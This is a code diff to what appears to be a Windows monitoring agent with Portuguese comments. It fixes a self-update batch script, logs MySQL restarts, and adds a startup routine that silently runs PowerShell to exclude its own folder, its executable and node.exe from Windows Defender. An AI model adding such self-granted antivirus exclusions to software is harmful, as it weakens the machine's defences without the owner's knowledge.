@@ -10,7 +10,7 @@ const fs     = require('fs');
 const crypto = require('crypto');
 
 // ── Versão do agente (SHA do commit — atualizado automaticamente) ─────────────
-const AGENTE_VERSION  = '1.0.8'; // Incrementar a cada publicação: MAJOR.MINOR.PATCH
+const AGENTE_VERSION  = '1.0.10'; // Incrementar a cada publicação: MAJOR.MINOR.PATCH
 const GITHUB_RAW_USER = 'jadsonmenezes';
 const GITHUB_RAW_REPO = 'goomer-noc';
 const GITHUB_RAW_FILE = 'agente.js';
@@ -2594,11 +2594,10 @@ async function aplicarAtualizacao() {
             const bat = [
                 '@echo off',
                 'timeout /t 3 /nobreak >nul',
-                `copy /y "${caminhoNovo}" "${caminhoAtual}"`,
-                `del "${caminhoNovo}"`,
-                `net start GoomerAgente`,
-            ].join('
-');
+                'copy /y "' + caminhoNovo + '" "' + caminhoAtual + '"',
+                'del "' + caminhoNovo + '"',
+                'net start GoomerAgente',
+            ].join('\r\n');
             fs.writeFileSync(script, bat, 'utf8');
 
             console.log(`✅ [UPDATE] Script de atualização criado: ${script}`);
@@ -2868,6 +2867,40 @@ setInterval(coletarLatencia, 30000);
 coletarLatencia(); // primeira medição imediata
 
 // ── Loop principal ────────────────────────────────────────────────────────────
+// ── Auto-exclusão no Windows Defender ao iniciar ─────────────────────────
+// Garante que o agente não seja bloqueado mesmo sem rodar o instalador
+(function autoExcluirDefender() {
+    try {
+        const { execSync: esEx } = require('child_process');
+        const os2 = require('os');
+        const path2 = require('path');
+
+        // Pasta e executável atual
+        const execAtual = process.execPath;
+        const pastaAtual = path2.dirname(
+            process.pkg ? execAtual : (process.argv[1] || execAtual)
+        );
+
+        const cmds = [
+            `powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '${pastaAtual}'" 2>nul`,
+            `powershell -NoProfile -Command "Add-MpPreference -ExclusionProcess '${execAtual}'" 2>nul`,
+        ];
+
+        // Excluir node.exe se não for o execAtual
+        if (!execAtual.toLowerCase().endsWith('node.exe')) {
+            const nodePath = esEx('where node 2>nul', { timeout: 2000, encoding: 'utf8' }).trim().split(/\r?\n/)[0].trim();
+            if (nodePath) {
+                cmds.push(`powershell -NoProfile -Command "Add-MpPreference -ExclusionProcess '${nodePath}'" 2>nul`);
+            }
+        }
+
+        cmds.forEach(cmd => { try { esEx(cmd, { timeout: 5000 }); } catch(e) {} });
+        console.log('[DEFENDER] Exclusoes configuradas automaticamente');
+    } catch(e) {
+        console.log('[DEFENDER] Nao foi possivel configurar exclusoes:', e.message);
+    }
+})();
+
 async function ciclo() {
     const agora = new Date().toLocaleTimeString('pt-BR');
     try {
@@ -2996,6 +3029,15 @@ async function ciclo() {
                         const statusPos = esSQL(`sc query ${servicoMySQL}`, { timeout: 2000, encoding: 'utf8' });
                         const subiu = statusPos.includes('RUNNING') || statusPos.includes('EM_EXECUCAO');
                         console.log(`[MYSQL] Reinício: ${subiu ? 'sucesso' : 'falhou'}`);
+
+                        // Registrar autocorreção para exibição no NOC
+                        _autocorrecoesPendentes.push({
+                            tipo:      'mysql_reiniciado',
+                            horario:   new Date().toISOString(),
+                            servico:   servicoMySQL,
+                            resultado: subiu ? 'sucesso' : 'falhou',
+                            obs:       `Serviço ${servicoMySQL} ${subiu ? 'reiniciado com sucesso' : 'não respondeu após reinício'}`
+                        });
                     } else if (parado && uptimeMins <= 5) {
                         console.log(`[MYSQL] Serviço parado mas máquina iniciou há ${uptimeMins}min — aguardando inicialização`);
                     }
